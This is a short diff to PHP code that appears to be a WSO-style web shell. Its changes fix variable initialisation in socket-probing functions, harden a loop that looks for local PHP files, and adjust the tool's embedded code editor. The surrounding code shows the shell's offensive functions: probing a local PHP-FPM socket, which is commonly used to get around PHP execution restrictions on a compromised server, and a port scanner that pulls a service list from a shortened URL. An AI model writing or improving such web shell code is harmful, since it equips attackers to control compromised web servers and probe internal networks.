@@ -146,6 +146,8 @@ try {
 			return $packet;
 		}
 		function findSocket() {
+			$errno = 0;
+			$errstr = '';
 			$connection = @fsockopen('127.0.0.1', 9000, $errno, $errstr, 3);
 			if (is_resource($connection)) {
 				fclose($connection);
@@ -170,9 +172,11 @@ try {
 				return array($fpm_socket, $port);
 			}
 		}
-		while ( !isset($test_file) ) {
+		$test_file = null;
+		while ( !$test_file ) {
 			$it = @glob(dirname(__FILE__)."/*.php");
 			foreach ($it as $f) $test_file = $f;
+			if ( !$test_file ) break;
 		}
 		$fpm_socket = findSocket();
 		if (!$fpm_socket) {
@@ -367,7 +371,7 @@ try {
 					</div>
 				<script>
 					codeEdit = function(hljs) {
-						document.querySelectorAll('textarea').forEach(function(textarea,code,holder,lines){
+						document.querySelectorAll('textarea:not([readonly])').forEach(function(textarea,code,holder,lines){
 							var
 							updateCode = function(text){
 								text += text[text.length-1] == '\\n'?' ':'';
@@ -459,7 +463,7 @@ try {
 								position:absolute;
 								z-index:0;
 							}
-							textarea{
+							textarea:not([readonly]){
 								position: relative;
 								z-index:1;
 								color:transparent;
@@ -546,6 +550,8 @@ try {
 		$db = wsoGetFile('https://bit.ly/port2service');
 		$ports = explode(',', $ports);
 		$open_ports = '';
+		$errno = 0;
+		$errstr = '';
 		foreach ($ports as $port) {
 			$connection = @fsockopen($address, $port, $errno, $errstr, 3);
 			if (is_resource($connection)) {
